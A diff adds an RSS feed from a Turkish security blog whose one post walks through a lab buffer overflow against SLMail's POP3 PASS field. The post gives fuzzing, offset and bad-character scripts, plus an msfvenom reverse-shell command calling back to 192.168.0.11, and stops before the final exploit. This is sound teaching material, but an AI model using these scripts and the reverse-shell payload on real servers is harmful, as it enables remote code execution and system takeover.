@@ -1,0 +1,1508 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Hakan Bayır</title>
+    <description>Siber güvenlik ve bilişim teknolojileri üzerine içerik üretilen kişisel bir blog.</description>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Sun, 02 Sep 2018 22:55:11 +0300</pubDate>
+    <lastBuildDate>Sun, 02 Sep 2018 22:55:11 +0300</lastBuildDate>
+    <generator>Jekyll v3.8.3</generator>
+    
+      <item>
+        <title>Buffer Overflow Uygulama Örneği - SLMail</title>
+        <description>&lt;p&gt;      Uzun bir aradan sonra bu not defterimi tekrar kullanmaya karar verdim. Bu yazıda, buffer overflow zafiyeti bulunan örnek bir uygulama üzerinde çalışma yapacağız. SLMail uygulamasına &lt;a href=&quot;https://www.exploit-db.com/apps/12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe&quot;&gt;bu&lt;/a&gt; linkten ulaşabilirsiniz. Uygulamayı 32 bit Windows VM üzerinde ayaklandırdıktan sonra aynı makineye &lt;a href=&quot;https://debugger.immunityinc.com/&quot;&gt;şu&lt;/a&gt; linkten eriştiğimiz Immunity Debugger aracını da kurmamız gerekiyor.&lt;/p&gt;
+
+&lt;center&gt;&lt;img src=&quot;/img/buffer-overflow-slmail/slmail-conf.png&quot; /&gt;&lt;/center&gt;
+
+&lt;p&gt;      SLMail konfigürasyon uygulamasını admin yetkileriyle çalıştırarak işe başlıyoruz.Aynı şekilde admin yetkileriyle çalıştırdığımız Immunity Debugger aracına SLmail Process’ini ekliyoruz ve &lt;code class=&quot;highlighter-rouge&quot;&gt;Run&lt;/code&gt; diyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/buffer-overflow-slmail/id-1.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/buffer-overflow-slmail/id-2.png&quot; height=&quot;522&quot; width=&quot;881&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      SLMail yüklü olan Windows sunucu üzerinde keşif çalışmalarımıza başlayalım.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sV -T4 192.168.0.19 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/buffer-overflow-slmail/nmap.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Ekran görüntüsünden SLMail servisinin çalışmaya başladığını görüyoruz. Bu mail servisini bağlantı kurmaya çalışırken kullanıcı adı ve parola ikilisini input olarak gönderiyoruz. Uygulama süresince parola parametresini taşırmaya çalışıp zafiyeti kullanarak kod çalıştırmaya çalışacağız. Bunun için öncelikle buffer’ın nerede taştığını tespit etmemiz gerekiyor. El yordamıyla nerede taştığını tespit etmemiz zaman alacağı için aşağıdaki gibi basit bir kod yardımıyla fuzzing işlemi gerçekleştireceğiz. Bu sayede buffer için ne büyüklükte bir yer ayrıldığını ve nerede taştığını anlamaya çalışacağız.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#fuzzer.py
+#!/usr/bin/python
+import time, struct, sys
+import socket as so
+
+junk=[&quot;A&quot;]
+max_buffer = 4000
+counter = 100
+increment = 200
+
+while len(junk) &amp;lt;= max_buffer:
+    junk.append(&quot;A&quot;*counter)
+    counter=counter+increment
+
+for string in junk:
+     try:
+	server = &quot;192.168.0.19&quot;
+	port = 110
+     except IndexError:
+	sys.exit()
+     print &quot;[+] Sending data %s bytes&quot; % len(string)
+     s = so.socket(so.AF_INET, so.SOCK_STREAM)
+     try:
+	s.connect((server,port))
+	s.recv(1024)
+	s.send('USER user\r\n')
+	s.recv(1023)
+	s.send('PASS ' + string + '\r\n')
+	s.send('QUIT\r\n')
+	s.close()
+     except:
+	print &quot;[+] Connection failed.&quot;
+sys.exit()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Debugger üzerine geldiğimizde aşağıdaki gibi buffer’ın taştığını ve EIP üzerine gelen &lt;code class=&quot;highlighter-rouge&quot;&gt;A&lt;/code&gt; karakterlerini görüyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/buffer-overflow-slmail/fuzzer-result.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Kodu çalıştırdığımızda uygulamamızın 2700 byte’lık input gönderme sırasında yerlerde çakıldığını göreceğiz. Bu işlem sayesinde buffer boyutu hakkında bilgi sahibi olduk. Bir sonraki aşamada EIP register’ı üzerine istediğimiz değeri getirmemiz için ne boyutta bir taşırma yapmamız gerektiğini anlamaya çalışacağız. Çünkü EIP register’ı, bir sonraki çalışacak olan komutun adres değerini tutacak. Bu sayede istediğimiz değeri buraya düşürebilirsek, taşırma işlemi ile kodumuzu yürütebileceğiz. Metasploit üzerinde yer alan pattern_create uygulaması ile istediğimiz boyutta bir pattern üretip hedefe yollayacağız. EIP üzerine denk gelen offset değerini alıp pattern_offset uygulamasında karşılık geldiği sırayı tespit edeceğiz. Bu sayede kaç boyutluk veriden sonra EIP üzerine değerimizin düştüğünü anlayacağız.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/buffer-overflow-slmail/pattern-create.png&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#pattern.py
+#!/usr/bin/python
+import time, struct, sys
+import socket as so
+
+pattern = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9&quot;
+
+try:
+   server = &quot;192.168.0.19&quot;
+   port = 110
+except IndexError:
+   sys.exit()
+s = so.socket(so.AF_INET, so.SOCK_STREAM)
+try:
+   s.connect((server,port))
+   s.recv(1024)
+   s.send('USER user' +'\r\n')
+   s.recv(1024)
+   s.send('PASS ' + pattern + '\r\n')
+   print &quot;\n[+] Completed.&quot;
+except:
+   print &quot;[+] Connection Failed.&quot;
+sys.exit()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      EIP üzerine gelen &lt;code class=&quot;highlighter-rouge&quot;&gt;39694438&lt;/code&gt; değeri bize kaç byte’lık veriden sonra buraya ulaşıldığını gösterecek.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/buffer-overflow-slmail/pattern-create-result.png&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/buffer-overflow-slmail/pattern-offset.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      2606 byte’lık veriden sonra EIP register’ına ulaşıyoruz. Kontrol amaçlı kodumuzu düzenleyerek EIP üzerine ‘B’ değerini bastıralım. Aşağıda görüldüğü gibi 2606 doğru bir değer olarak karşımıza çıkıyor.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#verify.py
+#!/usr/bin/python
+import time, struct, sys
+import socket as so
+
+junk = &quot;A&quot; * 2606 + &quot;B&quot; * 4 + &quot;C&quot; * 90
+
+try:
+   server = &quot;192.168.0.19&quot;
+   port = 110
+except IndexError:
+   sys.exit()
+s = so.socket(so.AF_INET, so.SOCK_STREAM)
+try:
+   s.connect((server,port))
+   s.recv(1024)
+   s.send('USER user' +'\r\n')
+   s.recv(1024)
+   s.send('PASS ' + junk + '\r\n')
+   print &quot;\n[+] Completed.&quot;
+except:
+   print &quot;[+] Connection Failed.&quot;
+sys.exit()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/buffer-overflow-slmail/pattern-offset-proof.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Bu aşamadan sonra en sıkıcı işlem başlıyor. Kodumuzun yürütülmesine engel olacak olan &lt;code class=&quot;highlighter-rouge&quot;&gt;badchar&lt;/code&gt;‘ları tespit edeceğiz. Shell kodumuzu, bu karakterleri içermeden üretmeyi sağlayacağız. Bunun için aşağıdaki gibi sıralı listeden tüm karakterleri göndererek başlıyoruz. Listede yer almayan &lt;code class=&quot;highlighter-rouge&quot;&gt;'\x00'&lt;/code&gt; yani NULL, dizeleri sonlandırdığı için doğrudan badchar olarak kabul edilir.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#badchar1.py
+#!/usr/bin/python
+import time, struct, sys
+import socket as so
+
+badchars=(
+&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;
+&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;
+&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;
+&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;
+&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;
+&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;
+&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;
+&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;
+&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;
+&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;
+&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;
+&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;
+&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;
+&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;
+&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;
+&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot; )
+
+junk = &quot;A&quot; * 2606 + &quot;B&quot; * 4 + badchars
+
+try:
+   server = &quot;192.168.0.19&quot;
+   port = 110
+except IndexError:
+   sys.exit()
+s = so.socket(so.AF_INET, so.SOCK_STREAM)
+try: 
+   s.connect((server,port))
+   s.recv(1024)
+   s.send('USER user' +'\r\n')
+   s.recv(1024)
+   s.send('PASS ' + junk + '\r\n')
+   print &quot;\n[+] Completed.&quot;
+except:
+   print &quot;[+] Connection Failed.&quot;
+sys.exit()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Karakterleri gönderdikten sonra Immunity Debugger üzerinde gelmesi gereken sıraya gelmemiş ve sırayı bozmuş olan karakterleri bulup badchar olarak işaretleyeceğiz. İlk incelemede x09’dan sonra x0a gelmesi gerekirken, gelmediği için bu karakterin sırayı bozduğunu anlıyoruz ve &lt;code class=&quot;highlighter-rouge&quot;&gt;x0a&lt;/code&gt;‘i badchar olarak tespit ediyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/buffer-overflow-slmail/badchar-1.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      &lt;code class=&quot;highlighter-rouge&quot;&gt;x0a&lt;/code&gt; olmadan kodu tekrar yollayalım.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#badchar2.py
+#!/usr/bin/python
+import time, struct, sys
+import socket as so
+
+badchars=(
+&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10&quot;
+&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;
+&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;
+&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;
+&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;
+&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;
+&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;
+&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;
+&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;
+&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;
+&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;
+&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;
+&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;
+&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;
+&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;
+&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot; )
+
+junk = &quot;A&quot; * 2606 + &quot;B&quot; * 4 + badchars
+
+try:
+   server = &quot;192.168.0.19&quot;
+   port = 110
+except IndexError:
+   sys.exit()
+s = so.socket(so.AF_INET, so.SOCK_STREAM)
+try: 
+   s.connect((server,port))
+   s.recv(1024)
+   s.send('USER user' +'\r\n')
+   s.recv(1024)
+   s.send('PASS ' + junk + '\r\n')
+   print &quot;\n[+] Completed.&quot;
+except:
+   print &quot;[+] Connection Failed.&quot;
+sys.exit()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Devam ederken tespit ettiğimiz bu karakteri listeden çıkarıp diğer karakterleri tekrar yolluyoruz. Ve ikinci badchar sırayı bozduğu için &lt;code class=&quot;highlighter-rouge&quot;&gt;x0d&lt;/code&gt;…&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/buffer-overflow-slmail/badchar-2.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      &lt;code class=&quot;highlighter-rouge&quot;&gt;x0a&lt;/code&gt; ve &lt;code class=&quot;highlighter-rouge&quot;&gt;x0d&lt;/code&gt; olmadan kodu tekrar yollayalım.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#badchar3.py
+#!/usr/bin/python
+import time, struct, sys
+import socket as so
+
+badchars=(
+&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10&quot;
+&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;
+&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;
+&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;
+&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;
+&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;
+&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;
+&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;
+&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;
+&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;
+&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;
+&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;
+&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;
+&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;
+&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;
+&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot; )
+
+junk = &quot;A&quot; * 2606 + &quot;B&quot; * 4 + badchars
+
+try:
+   server = &quot;192.168.0.19&quot;
+   port = 110
+except IndexError:
+   sys.exit()
+s = so.socket(so.AF_INET, so.SOCK_STREAM)
+try: 
+   s.connect((server,port))
+   s.recv(1024)
+   s.send('USER user' +'\r\n')
+   s.recv(1024)
+   s.send('PASS ' + junk + '\r\n')
+   print &quot;\n[+] Completed.&quot;
+except:
+   print &quot;[+] Connection Failed.&quot;
+sys.exit()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      İncelemeye devam ettikten sonra görüyoruz ki sıralama iyi gidiyor ve toplamda sadece iki tane badchar mevcut. Listeye koymadığımız ve en başından beri badchar kabul ettiğimiz &lt;code class=&quot;highlighter-rouge&quot;&gt;x00&lt;/code&gt; ile birlikte 3 tane badchar belirledik.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;x00,x0a,x0d
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/buffer-overflow-slmail/nobadchar.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Badchar belirleme işlem bittikten sonra msfvenom ile üretim yaparken bu karakterleri belirterek işleme devam ediyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.11 LPORT=443 -f py -b '\x00\x0a\x0d\' -a x86 --platform windows -e x86/shikata_ga_nai
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/buffer-overflow-slmail/msfvenom.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Bu aşamaya kadar buffer’ın nerede taştığını ve badchar bulma işlemlerini gerçekleştirdik. Çalıştıracak olduğumuz uygulamayı da oluşturduk. Sıra son olarak EIP üzerine yazacağımız değeri bulmaya geldi. Buffer taştıktan sonra EIP register’ı bizi çalıştıracak olduğumuz uygulamaya götürecek. İşimizi kolaylaştırmak için Immunity Debugger’a Mona eklentisini ekleyeceğiz. &lt;a href=&quot;https://github.com/corelan/mona/blob/master/mona.py&quot;&gt;Şuradan&lt;/a&gt; edinebilirsiniz. Buradaki kodu, Immunity Debugger’ın kurulu olduğu dizindeki &lt;code class=&quot;highlighter-rouge&quot;&gt;PyCommands&lt;/code&gt; klasörünün içine yapıştırıyoruz.&lt;/p&gt;
+
+&lt;p&gt;      Öncelikle ‘!mona modules’ yazarak uygulamanın çağırdığı DLL’i tespit ediyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!mona modules
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/buffer-overflow-slmail/slmfc-dll.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Sonrasında ‘!mona find -s “\xff\xe4” -m slmfc.dll’ ile hedef adresimizi buluyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!mona find -s &quot;\xff\xe4&quot; -m slmfc.dll
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/buffer-overflow-slmail/esp.png&quot; /&gt;&lt;/p&gt;
+
